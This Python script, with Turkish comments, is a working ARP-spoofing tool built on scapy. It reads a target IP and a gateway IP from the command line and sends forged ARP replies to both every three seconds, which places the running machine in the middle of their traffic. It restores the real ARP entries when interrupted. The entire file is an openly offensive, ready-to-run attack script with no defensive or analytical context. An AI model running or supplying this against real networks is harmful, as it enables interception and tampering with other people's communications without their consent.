import scapy.all as scapy
import time
import optparse


def get_mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined = broadcast/arp_request
    answered_list = scapy.srp(combined, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def arp_poisoning(target_ip, poisoned_ip):
    target_mac = get_mac_address(target_ip)

    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip) # op=2 ARP Response olustur anlamina gelir.
    scapy.send(arp_response, verbose=False)    # Hedef cihazda arp -a(kali modem MAC leri aynı olur.)


def reset_operation(fooled_ip, gateway_ip):
    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)

    arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(arp_response, verbose=False, count=6)    # Resetlenmesinden emin olmak için 6 paket gonderiliyor.


def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t", "--target", dest="target_ip", help="Enter Target IP")
    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="Enter Gateway IP")

    options = parse_object.parse_args()[0]

    if not options.target_ip:
        print("Enter Target IP")
    if not options.gateway_ip:
        print("Enter Gateway IP")

    return options


number = 0

user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip

try:
    while True:
        arp_poisoning(user_target_ip, user_gateway_ip)
        arp_poisoning(user_gateway_ip, user_target_ip)
        number += 2

        print("\rSending packets " + str(number), end=" ")      # pyhon3 Terminalde tek satira yazar \r

        time.sleep(3)

except KeyboardInterrupt:
    print("\nQuit & Reset")
    reset_operation(user_target_ip, user_gateway_ip)
    reset_operation(user_gateway_ip, user_target_ip)
